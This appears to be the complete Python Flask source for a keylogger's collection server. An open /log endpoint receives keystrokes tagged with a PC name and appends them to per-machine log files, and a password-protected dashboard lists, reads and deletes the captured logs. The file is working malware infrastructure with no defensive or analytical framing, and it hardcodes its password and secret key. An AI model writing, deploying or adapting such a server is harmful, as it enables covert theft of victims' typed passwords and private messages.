from flask import Flask, request, jsonify, render_template, session, redirect, url_for
import logging
import os
from functools import wraps

app = Flask(__name__)
app.secret_key = 'super_secret_key_change_this_in_production'
PASSWORD = 'DADDY69$'

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

LOG_DIR = 'logs'
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['password'] == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            error = 'ACCESS DENIED'
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/api/files', methods=['GET'])
@login_required
def list_files():
    files = [f for f in os.listdir(LOG_DIR) if f.endswith('.log')]
    return jsonify(files)

@app.route('/api/logs/<filename>', methods=['GET'])
@login_required
def get_logs(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    
    with open(filepath, 'r') as f:
        content = f.read()
    return jsonify({'content': content})

@app.route('/api/delete/<filename>', methods=['DELETE'])
@login_required
def delete_log(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
        return jsonify({'status': 'deleted'}), 200
    return jsonify({'error': 'File not found'}), 404

@app.route('/log', methods=['POST'])
def log_key():
    data = request.json
    if not data or 'key' not in data:
        return jsonify({'error': 'No key provided'}), 400
    
    key = data['key']
    pc_name = data.get('pc_name', 'unknown_pc')
    
    # Sanitize pc_name to prevent directory traversal or weird filenames
    pc_name = "".join([c for c in pc_name if c.isalpha() or c.isdigit() or c in (' ', '-', '_')]).strip()
    if not pc_name:
        pc_name = 'unknown_pc'

    filename = f"{pc_name}.log"
    filepath = os.path.join(LOG_DIR, filename)
    
    logger.info(f"Key received from {pc_name}: {key}")
    
    with open(filepath, 'a') as f:
        if key == '[ENTER]':
            f.write('\n')
        else:
            f.write(f"{key}")
        
    return jsonify({'status': 'success'}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port)
